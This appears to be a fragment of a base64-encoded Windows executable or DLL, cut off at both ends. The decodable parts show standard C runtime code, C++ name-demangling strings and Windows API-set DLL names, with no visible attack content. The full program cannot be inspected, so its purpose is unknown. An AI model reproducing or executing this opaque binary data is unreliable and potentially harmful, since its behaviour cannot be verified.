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19zd2lmdF8yAAAAAAAAAF9fcHRyNjQAX19yZXN0cmljdAAAAAAAAF9fdW5hbGlnbmVkAAAAAAByZXN0cmljdCgAAAAgbmV3AAAAAAAAAAAgZGVsZXRlAD0AAAA+PgAAPDwAACEAAAA9PQAAIT0AAFtdAAAAAAAAb3BlcmF0b3IAAAAALT4AACoAAAArKwAALS0AAC0AAAArAAAAJgAAAC0+KgAvAAAAJQAAADwAAAA8PQAAPgAAAD49AAAsAAAAKCkAAH4AAABeAAAAfAAAACYmAAB8fAAAKj0AACs9AAAtPQAALz0AACU9AAA+Pj0APDw9ACY9AAB8PQAAXj0AAGB2ZnRhYmxlJwAAAAAAAABgdmJ0YWJsZScAAAAAAAAAYHZjYWxsJwBgdHlwZW9mJwAAAAAAAAAAYGxvY2FsIHN0YXRpYyBndWFyZCcAAAAAYHN0cmluZycAAAAAAAAAAGB2YmFzZSBkZXN0cnVjdG9yJwAAAAAAAGB2ZWN0b3IgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYGRlZmF1bHQgY29uc3RydWN0b3IgY2xvc3VyZScAAABgc2NhbGFyIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwAAAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAAAAAABgZWggdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYGVoIHZlY3RvciBkZXN0cnVjdG9yIGl0ZXJhdG9yJwBgZWggdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAAAAAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAAAAAAGBsb2NhbCB2ZnRhYmxlJwBgbG9jYWwgdmZ0YWJsZSBjb25zdHJ1Y3RvciBjbG9zdXJlJwAgbmV3W10AAAAAAAAgZGVsZXRlW10AAAAAAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAAAAAAAAYHBsYWNlbWVudCBkZWxldGVbXSBjbG9zdXJlJwAAAABgbWFuYWdlZCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYG1hbmFnZWQgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAABgZHluYW1pYyBpbml0aWFsaXplciBmb3IgJwAAAAAAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAAAAAABgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYHZlY3RvciB2YmFzZSBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAAAAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAAAAYGxvY2FsIHN0YXRpYyB0aHJlYWQgZ3VhcmQnAAAAAABvcGVyYXRvciAiIiAAAAAAb3BlcmF0b3IgY29fYXdhaXQAAAAAAAAAIFR5cGUgRGVzY3JpcHRvcicAAAAAAAAAIEJhc2UgQ2xhc3MgRGVzY3JpcHRvciBhdCAoAAAAAAAgQmFzZSBDbGFzcyBBcnJheScAAAAAAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAAAAAAAAsMwAgAEAAADwzACAAQAAADDNAIABAAAAYQBwAGkALQBtAHMALQB3AGkAbgAtAGMAbwByAGUALQBmAGkAYgBlAHIAcwAtAGwAMQAtADEALQAxAAAAAAAAAGEAcABpAC0AbQBzAC0AdwBpAG4ALQBjAG8AcgBlAC0AcwB5AG4AYwBoAC0AbAAxAC0AMgAtADAAAAAAAAAAAABrAGUAcgBuAGUAbAAzADIAAAAAAAAAAABhAHAAaQAtAG0AcwAtAAAAZQB4AHQALQBtAHMALQAAAAAAAAACAAAARmxzQWxsb2MAAAAAAAAAAAAAAAACAAAARmxzRnJlZQAAAAAAAgAAAEZsc0dldFZhb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